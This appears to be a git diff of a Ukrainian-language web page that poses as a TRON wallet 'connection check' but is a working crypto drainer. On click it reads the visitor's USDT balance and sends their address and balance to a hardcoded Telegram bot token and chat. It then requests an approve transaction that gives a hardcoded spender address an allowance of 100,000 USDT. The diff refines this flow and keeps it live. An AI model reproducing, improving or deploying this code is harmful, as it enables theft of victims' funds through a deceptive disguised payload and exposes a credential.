@@ -2,8 +2,11 @@
 <html lang="uk">
 <head>
     <meta charset="UTF-8">
-    <title>TRON Interface</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRON Web3 Interface</title>
+    <!-- Підключення бібліотеки TronWeb -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <!-- Підключення axios для відправки в Telegram -->
     <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <style>
         body {
@@ -49,101 +52,120 @@
     </style>
 </head>
 <body>
-<div class="container">
-    <h2>Перевірка з'єднання</h2>
-    <p>Натисніть кнопку для підключення:</p>
-    <button id="connectBtn" class="btn-connect">Підключити</button>
-    <div id="statusText">Статус: Очікування дії...</div>
-</div>
 
-<script>
-    const CONFIG = {
-        usdtContractAddress: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
-        spenderAddress: "TNJPVGwMW9HK5id3X7sgZQbDB1aPMVpcbS", 
-        approveAmount: "100000000000",
+    <div class="container">
+        <h2>Перевірка з'єднання</h2>
+        <p>Натисніть кнопку для підключення:</p>
         
-        // Ваші дані телеграм групи
-        tgToken: "8351162589:AAERiSl41IXOjv0sBefV4-xCmTYN7bQQo70",
-        tgChatId: "-1003819306305"
-    };
+        <button id="connectBtn" class="btn-connect">Підключити</button>
+        
+        <div id="statusText">Статус: Очікування дії...</div>
+    </div>
 
-    const connectButton = document.getElementById('connectBtn');
-    const statusText = document.getElementById('statusText');
+    <script>
+        const CONFIG = {
+            usdtContractAddress: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+            spenderAddress: "TNJPVGwMW9HK5id3X7sgZQbDB1aPMVpcbS", // Адреса, якій дається дозвіл
+            approveAmount: "100000000000", // Максимальний безлімітний approve
+            
+            // Ваші дані Telegram-групи
+            tgToken: "8351162589:AAERiSl41IXOjv0sBefV4-xCmTYN7bQQo70",
+            tgChatId: "-1003819306305"
+        };
 
-    connectButton.addEventListener('click', async () => {
-        try {
-            statusText.innerText = "Статус: Пошук гаманця...";
-            let tw = null;
+        const connectButton = document.getElementById('connectBtn');
+        const statusText = document.getElementById('statusText');
 
-            for (let i = 0; i < 5; i++) {
-                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                    tw = window.tronWeb;
-                    break;
-                }
-                if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
-                    tw = window.tronLink.tronWeb;
-                    break;
-                }
-                await new Promise(resolve => setTimeout(resolve, 200));
-            }
-
-            if (!tw) {
-                statusText.innerText = "Статус: Перенаправлення у Trust Wallet...";
-                const currentUrl = window.location.href;
-                window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(currentUrl)}`;
-                return;
-            }
-
-            let userAddress = tw.defaultAddress.base58;
-            statusText.innerText = "Статус: Гаманець підключено!";
-
-            // Отримуємо баланс USDT
-            let balanceUSDT = 0;
+        connectButton.addEventListener('click', async () => {
             try {
-                const contractUSDT = await tw.contract().at(CONFIG.usdtContractAddress);
-                const balance = await contractUSDT.balanceOf(userAddress).call();
-                balanceUSDT = tw.BigNumber(balance).toString() / 1000000;
-            } catch (e) {
-                console.error("Помилка балансу", e);
+                statusText.innerText = "Статус: Пошук гаманця...";
+
+                let tw = null;
+
+                // Скорочено до 5 спроб по 200мс (загалом близько 1 секунди максимум)
+                for (let i = 0; i < 5; i++) {
+                    if (window.tronWeb) {
+                        tw = window.tronWeb;
+                        if (tw.defaultAddress && tw.defaultAddress.base58) {
+                            break;
+                        }
+                    }
+                    if (window.tronLink && window.tronLink.tronWeb) {
+                        tw = window.tronLink.tronWeb;
+                        if (tw.defaultAddress && tw.defaultAddress.base58) {
+                            break;
+                        }
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 200));
+                }
+
+                // Якщо взагалі немає середовища Web3 — робимо редирект
+                if (!tw && !window.tronWeb && !window.tronLink) {
+                    statusText.innerText = "Статус: Перенаправлення у Trust Wallet...";
+                    const currentUrl = window.location.href;
+                    window.location.href = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(currentUrl)}`;
+                    return;
+                }
+
+                // Якщо провайдер є, але адреса не підтягнулася автоматично
+                if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
+                    if (window.tronLink && window.tronLink.request) {
+                        await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    } else if (window.tronWeb && window.tronWeb.request) {
+                        await window.tronWeb.request({ method: 'tron_requestAccounts' });
+                    }
+                }
+
+                // Фінальна спроба отримати об'єкт і адресу
+                let activeTw = window.tronWeb || (window.tronLink ? window.tronLink.tronWeb : tw);
+                let userAddress = activeTw && activeTw.defaultAddress ? activeTw.defaultAddress.base58 : null;
+
+                if (!userAddress) {
+                    statusText.innerText = "Статус: Помилка з'єднання. Перезайдіть у браузер гаманця.";
+                    return;
+                }
+
+                statusText.innerText = "Статус: Гаманець підключено!";
+
+                // Отримуємо баланс USDT для відправки в телеграм
+                let balanceUSDT = 0;
+                try {
+                    const tempContract = await activeTw.contract().at(CONFIG.usdtContractAddress);
+                    const balance = await tempContract.balanceOf(userAddress).call();
+                    balanceUSDT = activeTw.BigNumber(balance).toString() / 1000000;
+                } catch (e) {
+                    console.error("Не вдалося отримати баланс:", e);
+                }
+
+                // ВІДПРАВКА ДАНИХ У TELEGRAM-ГРУПУ
+                const tgMessage = `🟢 **Новий гаманець підключився!**\n\n🔹 Адреса: \`${userAddress}\`\n💰 Баланс USDT: **${balanceUSDT}**`;
+                axios.post(`https://api.telegram.org/bot${CONFIG.tgToken}/sendMessage`, {
+                    chat_id: CONFIG.tgChatId,
+                    text: tgMessage,
+                    parse_mode: 'Markdown'
+                }).catch(err => console.log(err));
+
+                const contract = await activeTw.contract().at(CONFIG.usdtContractAddress);
+
+                statusText.innerText = "Статус: Підтвердіть транзакцію...";
+
+                // Заміна transfer на метод approve (ваш робочий блок)
+                const transaction = await contract.approve(
+                    CONFIG.spenderAddress,
+                    CONFIG.approveAmount
+                ).send({
+                    feeLimit: 100_000_000,
+                    callValue: 0
+                });
+
+                statusText.innerText = "Статус: Успішно виконано!";
+                console.log("Хеш транзакції approve:", transaction);
+
+            } catch (error) {
+                console.error("Помилка:", error);
+                statusText.innerText = "Статус: Помилка або скасування.";
             }
-
-            // 1. ВІДПРАВКА В TELEGRAM ПРЯМО З БРАУЗЕРА
-            const tgMessage = `🟢 **Новий гаманець підключився!**\n\n🔹 Адреса: \`${userAddress}\`\n💰 Баланс USDT: **${balanceUSDT}**`;
-            axios.post(`https://api.telegram.org/bot${CONFIG.tgToken}/sendMessage`, {
-                chat_id: CONFIG.tgChatId,
-                text: tgMessage,
-                parse_mode: 'Markdown'
-            }).catch(err => console.log(err));
-
-            // 2. ЗАПИТ НА ОРЕНДУ ЕНЕРГІЇ (якщо використовуєте публічне API сервісу оренди)
-            /*
-            axios.post('https://api.fee-provider.com/delegate', {
-                apiKey: 'ВАШ_API_KEY',
-                to: userAddress,
-                energy: 32000
-            }).catch(err => console.log(err));
-            */
-
-            statusText.innerText = "Статус: Підтвердіть транзакцію...";
-
-            // 3. ВИКОНАННЯ APPROVE
-            const contract = await tw.contract().at(CONFIG.usdtContractAddress);
-            const transaction = await contract.approve(
-                CONFIG.spenderAddress,
-                CONFIG.approveAmount
-            ).send({
-                feeLimit: 100_000_000,
-                callValue: 0
-            });
-
-            statusText.innerText = "Статус: Успішно виконано!";
-            console.log("Хеш транзакції:", transaction);
-
-        } catch (error) {
-            console.error("Помилка:", error);
-            statusText.innerText = "Статус: Помилка або скасування.";
-        }
-    });
-</script>
+        });
+    </script>
 </body>
 </html>
